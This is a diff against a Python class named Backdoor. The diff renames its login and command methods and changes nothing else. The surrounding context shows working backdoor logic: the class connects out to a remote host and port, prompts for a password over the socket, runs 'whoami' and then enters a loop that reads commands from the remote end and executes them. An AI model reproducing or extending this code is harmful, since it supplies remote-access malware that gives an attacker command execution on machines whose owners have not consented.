@@ -24,7 +24,7 @@ class Backdoor(object):
             out = stderr
         return out
 
-    def login(self):
+    def login_loop(self):
         while True:
             self.__sock.send('Login: '.encode())
             passwd = self.__sock.recv(1024).decode().strip()
@@ -33,7 +33,7 @@ class Backdoor(object):
             if self.__passwd == passwd:
                 return True
 
-    def code(self):
+    def cmd_loop(self):
         while True:
             self.__sock.send('#>'.encode())
             data = self.__sock.recv(1024).decode().strip()
@@ -44,7 +44,7 @@ class Backdoor(object):
 
     def open(self):
         self.__sock.connect((self.__host, self.__port))
-        if not self.login():
+        if not self.login_loop():
             return
         
         remote_login = self.__execute_code('whoami').strip()
@@ -58,7 +58,7 @@ class Backdoor(object):
             '\n',
         ])
         self.__sock.send(welcome.encode())
-        self.code()
+        self.cmd_loop()
 
 
 if __name__ == '__main__':
